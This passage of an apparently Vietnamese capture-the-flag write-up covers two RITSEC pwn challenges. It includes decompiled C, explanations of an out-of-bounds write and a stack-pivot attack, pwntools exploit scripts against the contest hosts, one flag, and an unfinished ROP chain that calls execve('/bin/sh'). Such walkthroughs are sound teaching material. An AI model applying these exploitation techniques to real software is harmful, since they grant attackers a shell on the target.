+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (local_29 <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;U&#39;</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>LAB_0040140e:
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Unknown option </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">%c</span><span style="color:#ae81ff">\&#39;\n</span><span style="color:#e6db74">&#34;</span>,(ulong)(uint)(<span style="color:#66d9ef">int</span>)local_29);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_29 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;C&#39;</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Which ingredient would you like to change?: &#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%u%*c&#34;</span>,<span style="color:#f92672">&amp;</span>local_28);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (local_28 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">9</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter ingredient: &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fgets</span>(ingredients <span style="color:#f92672">+</span> (ulong)local_28 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x20</span>,stdin);
+</span></span><span style="display:flex;"><span>        uVar1 <span style="color:#f92672">=</span> local_28;
+</span></span><span style="display:flex;"><span>        sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(ingredients <span style="color:#f92672">+</span> (ulong)local_28 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(undefined1 <span style="color:#f92672">*</span>)((ulong)uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> sVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40407f</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;The recipe doesn</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t have that many ingredients&#34;</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (local_29 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;S&#39;</span>) <span style="color:#66d9ef">goto</span> LAB_0040140e;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (local_24 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; local_24 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>; local_24 <span style="color:#f92672">=</span> local_24 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d. %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)local_24,ingredients <span style="color:#f92672">+</span> (ulong)local_24 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Chương trình mắc lỗi ở OPTION &lsquo;C&rsquo;, Cụ thể là lỗi OOB (Out Of Bounds)</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Which ingredient would you like to change?: &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%u%*c&#34;</span>,<span style="color:#f92672">&amp;</span>local_28);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (local_28 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">9</span>) { <span style="color:#75715e">// &lt;--- LỖ HỔNG Ở ĐÂY
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter ingredient: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(ingredients <span style="color:#f92672">+</span> (ulong)local_28 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, stdin);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ở trong tùy chọn S chương trình chỉ in ra 0-&gt;7 tổng là 8 phần tử:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (local_24 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; local_24 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>; local_24 <span style="color:#f92672">=</span> local_24 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d. %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)local_24,ingredients <span style="color:#f92672">+</span> (ulong)local_24 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nhưng ở OPTION C cho nhập tới index 8
+Điều kiện để win bài này rất đơn giản</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (pi <span style="color:#f92672">==</span> <span style="color:#ae81ff">3.141592653589793</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Yummy! This is the perfect pi!&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nếu ghi đè được biến pi thành 3.141592653589793 thì hàm sẽ vào SHELL!!!
+vì biến pi nằm ngay sau mảng ingredients(tạm gọi) khi ta nhập index = 8 tương đương với ingredients[8] == pi (vì mảng ingredients chỉ đến index 7) thì ta sẽ ghi đè được vào biến pi
+Ta đổi: 3.141592653589793 == 0x400921fb54442d18</p>
+<h3 id="payload">PAYLOAD</h3>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;bake-a-pi.ctf.ritsec.club&#39;</span>,<span style="color:#ae81ff">1555</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;:&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;8&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;:&#39;</span>, p64(<span style="color:#ae81ff">0x400921fb54442d18</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;T&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>FLAG: RS{0ff_by_0n3_4s_e4sy_4s_4_sk1llb17_p1}</code></p>
+<h2 id="2-domonkeysswim">2. doMonkeysSwim</h2>
+<p><img src="https://hackmd.io/_uploads/ryZGqixhbx.png" alt="image"></p>
+<h3 id="phân-tích-1">Phân tích:</h3>
+<p><img src="https://hackmd.io/_uploads/rk89ijxhbg.png" alt="image">
+Bài có 6 option trong đó có 3 option sau có dính lỗi:
+<code>Monket see</code>: Cho phép nhập index để in ra một giá trị. Không có cơ chế kiểm tra giới hạn (Out-of-bounds Read). Nếu nhập index = 3, ta rò rỉ (leak) được Stack Canary
+<code>Monkey swaperoo</code>: Cho phép ghi một lượng lớn dữ liệu tùy ý vào một vùng nhớ BSS có tên là bed (địa chỉ cố định 0x4cca60).
+<code>Monkey do</code>: Sử dụng hàm <code>fgets(buf, 40, stdin)</code>. buf nằm cách Canary 24 bytes. Ta có 24 (padding) + 8 (Canary) + 8 (Saved RBP) = 40 bytes. Đây là lỗi Stack/Buffer Overflow vừa khít để ghi đè RBP, mở đường cho kỹ thuật Stack Pivot.</p>
+<h3 id="ý-tưởng-khai-thác">Ý tưởng khai thác:</h3>
+<p>Vì fgets chỉ cho phép ghi đè đúng đến Saved RBP (không chạm tới được Saved RIP), ta không thể chạy ROP chain trực tiếp trên Stack. Giải pháp là kết hợp Stack Pivot và BSS Injection.</p>
+<ol>
+<li>Leak Canary. Lấy Canary từ <code>Option 3</code> để chuẩn bị cho payload overflow, đảm bảo chương trình không bị crash khi kết thúc hàm.</li>
+<li>Ghi một ROP Chain hoàn chỉnh và chuỗi &ldquo;/bin/sh\x00&rdquo; vào vùng nhớ bed thông qua <code>Option 5</code>.</li>
+<li>Dùng Option 4, gửi payload đè 24 bytes rác + Canary xịn + Saved RBP trỏ về vùng nhớ bed.</li>
+<li>Khi hàm main kết thúc, lệnh leave; ret sẽ gán RSP = RBP, khiến Stack bị xoay (pivot) sang vùng bed và bắt đầu thực thi ROP Chain.</li>
+</ol>
+<h3 id="payload-1">PAYLOAD</h3>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;doMonkeysSwim_patched&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;alacritty&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;dms.ctf.ritsec.club&#34;</span>, <span style="color:#ae81ff">1400</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0x&#34;</span>)
+</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    bed <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;bed&#34;</span>]
+</span></span><span style="display:flex;"><span>    poprdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401f43</span>
+</span></span><span style="display:flex;"><span>    poprsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401f45</span>
+</span></span><span style="display:flex;"><span>    poprdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401f47</span>
+</span></span><span style="display:flex;"><span>    poprax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401f49</span>
+</span></span><span style="display:flex;"><span>    syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401f26</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> p64(canary)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(poprdi)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(bed <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x58</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(poprsi)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(poprdx)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(poprax)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(syscall)
